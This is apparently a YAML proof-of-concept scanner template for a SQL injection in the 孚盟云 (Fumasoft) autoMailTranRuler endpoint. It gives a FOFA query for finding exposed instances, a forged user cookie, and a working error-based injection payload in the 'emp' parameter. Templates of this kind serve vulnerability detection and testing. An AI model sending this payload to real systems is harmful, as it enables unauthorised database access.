id: poc-yaml-fumasoft-automailtranruler-sqli
info:
  name: 孚盟云 autoMailTranRuler SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 孚盟云
  fofa: app="孚盟软件-孚盟云"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /m/Dingding/Ajax/AjaxMailInSend.ashx
  headers:
    Cookie: UserCookie={"empId":"1"}
    Content-Type: application/x-www-form-urlencoded
  data: action=autoMailTranRuler&emp=1)/**/and/**/+(sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))=1&fid=&mid=&auotTrans=false&transFlag=false&noticeFlag=false&memo=
  expression: status_code == 200 && contains(body,"0x" + t2 ) && contains(body,"select
    EmpID") && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
transport: http
